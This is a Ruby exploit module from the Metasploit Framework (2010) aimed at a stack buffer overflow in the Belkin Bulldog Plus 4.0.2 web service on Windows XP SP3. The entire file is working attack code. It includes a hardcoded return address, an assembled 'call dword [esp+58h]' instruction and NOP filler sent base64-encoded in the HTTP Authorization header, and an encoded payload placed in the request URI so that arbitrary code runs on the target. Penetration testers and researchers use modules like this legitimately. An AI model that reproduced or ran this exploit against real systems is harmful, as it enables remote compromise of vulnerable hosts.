##
# $Id: belkin_bulldog.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Belkin Bulldog Plus Web Service Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Belkin Bulldog Plus
				4.0.2 build 1219. When sending a specially crafted http request,
				an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'OSVDB', '54395' ],
					[ 'BID', '34033' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =>  'True',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 English', { 'Ret' => 0x7e4456f7 } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Mar 8 2009'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def exploit
		c = connect

		dwerd = Metasm::Shellcode.assemble(Metasm::Ia32.new, "call dword [esp+58h]").encode_string

		filler = [target.ret].pack('V') + dwerd + make_nops(28)

		print_status("Trying target #{target.name}...")

		send_request_raw({
			'uri'          => payload.encoded,
			'version'      => '1.1',
			'method'       => 'GET',
			'headers'      =>
			{
				'Authorization' => "Basic #{Rex::Text.encode_base64(filler)}"
			}
		}, 5)

		handler
	end
end